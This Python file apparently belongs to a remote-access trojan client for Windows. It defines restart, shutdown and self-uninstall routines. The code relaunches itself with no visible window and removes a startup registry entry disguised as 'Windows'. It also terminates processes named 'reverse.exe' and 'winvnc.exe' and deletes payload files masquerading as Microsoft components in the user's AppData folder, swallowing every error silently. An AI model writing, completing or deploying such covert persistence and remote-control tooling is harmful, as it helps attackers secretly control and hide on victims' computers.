import os
import sys
import shutil
import winreg as reg
import subprocess
import psutil

class ClientControl:
    @staticmethod
    def restart_self():
        python = sys.executable
        script = sys.argv[0]
        subprocess.Popen([python, script], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0)

    @staticmethod
    def shutdown_self():
        os._exit(0)

    @staticmethod
    def uninstall_self():
        def remove_from_startup_registry():
            key = reg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "Windows"
            
            try:
                with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as registry_key:
                    reg.DeleteValue(registry_key, value_name)
            except FileNotFoundError:
                pass
            except Exception:
                pass

        def close_processes(process_names):
            try:
                for process in psutil.process_iter(attrs=['pid', 'name']):
                    if process.info['name'] in process_names:
                        psutil.Process(process.info['pid']).terminate()
            except:
                pass

        def remove_package():
            try:
                subprocess.check_call([sys.executable.replace("pythonw.exe", "python.exe"), "-m", "pip", "uninstall", "thispackagedoesnotexist"], creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

        def remove_files_and_folders(python_library_path, installation_file, bat_file):
            try:
                if os.path.exists(python_library_path):
                    shutil.rmtree(python_library_path)

                if os.path.exists(installation_file):
                    os.remove(installation_file)

                if os.path.exists(bat_file):
                    os.remove(bat_file)

            except Exception:
                pass

        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python')
        installation_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.pyw')
        bat_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.bat')

        remove_from_startup_registry()
        close_processes(["reverse.exe", "winvnc.exe"])
        remove_package()
        remove_files_and_folders(python_library_path, installation_file, bat_file)
        ClientControl.shutdown_self()